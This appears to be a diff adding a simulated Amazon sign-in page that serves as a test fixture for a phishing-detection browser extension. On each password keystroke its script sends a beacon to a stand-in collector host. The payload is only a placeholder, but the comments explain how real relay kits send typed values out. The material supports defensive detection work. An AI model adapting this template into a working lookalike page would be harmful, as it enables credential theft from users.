@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Amazon - Sign in</title>
+<!--
+  Demo simulation only. Tier 3, network traffic inspection.
+
+  Every domain signal is clean, the page markup is clean, and the form posts
+  to itself. Nothing on this page is wrong until the user starts typing.
+
+  Then the page fires a cross-origin request on every keystroke in the
+  password field, with no form submission anywhere. That is the shape of a
+  real-time credential relay, and it is only observable from inside the page:
+  chrome.webRequest can see that a request went somewhere, but not that it
+  went 3ms after a keystroke in a password field and before any submit.
+
+  SAFETY: this page deliberately does NOT send what you type. It sends a fixed
+  placeholder string to a host that does not resolve. The behaviour is real;
+  the payload is not. The extension never reads the field value either -- it
+  reports a hostname, a request kind, and a timing delta, and nothing else.
+-->
+<meta name="demo-hostname" content="amazon-order-verify.com">
+<meta name="demo-https" content="true">
+<meta name="demo-domain-age-days" content="2600">
+<meta name="demo-blocklist-hit" content="false">
+<meta name="demo-arrived-via-link" content="false">
+<meta name="demo-first-visit" content="false">
+<style>
+  body { font-family: -apple-system, Arial, sans-serif; background: #fff; margin: 0; }
+  .wrap { max-width: 350px; margin: 28px auto; }
+  .logo { text-align: center; font-size: 26px; font-weight: 700; color: #232F3E; margin-bottom: 14px; }
+  .card { border: 1px solid #ddd; border-radius: 8px; padding: 20px; }
+  h2 { margin: 0 0 12px; font-size: 21px; font-weight: 400; }
+  label { display: block; font-size: 13px; font-weight: 700; margin: 12px 0 5px; }
+  input { width: 100%; padding: 8px; border: 1px solid #a6a6a6; border-radius: 3px; box-sizing: border-box; font-size: 14px; }
+  button { margin-top: 16px; width: 100%; padding: 9px; background: #FFD814; border: 1px solid #FCD200; border-radius: 8px; font-size: 14px; cursor: pointer; }
+  .note { max-width: 460px; margin: 26px auto 40px; text-align: center; color: #888; font-size: 12px; line-height: 1.55; }
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="logo">amazon</div>
+    <div class="card">
+      <h2>Sign in</h2>
+      <form action="/ap/signin" method="POST">
+        <label for="email">Email or mobile phone number</label>
+        <input id="email" type="text" autocomplete="username">
+
+        <label for="pass">Password</label>
+        <input id="pass" type="password" autocomplete="current-password">
+
+        <button type="submit">Sign in</button>
+      </form>
+    </div>
+  </div>
+  <p class="note">
+    Demo page &mdash; focus the password field and the extension says it looks
+    fine, because at that moment it does. Type a character and watch the card
+    escalate: the page has started relaying on every keystroke.
+  </p>
+
+  <script>
+    // DEMO ONLY. A real kit would put the field's value in this beacon. This
+    // one sends a fixed string to a host that does not exist, so the extension
+    // has genuine traffic to observe and nothing is ever transmitted.
+    //
+    // sendBeacon rather than fetch on purpose: it is fire-and-forget, it
+    // survives the page being closed, and it is what a relay kit actually
+    // reaches for.
+    document.getElementById('pass').addEventListener('input', function () {
+      try {
+        navigator.sendBeacon(
+          'https://relay.credential-collector.invalid/k',
+          'demo-placeholder-not-your-keystrokes'
+        );
+      } catch (e) { /* expected: the host does not resolve */ }
+    });
+  </script>
+</body>
+</html>
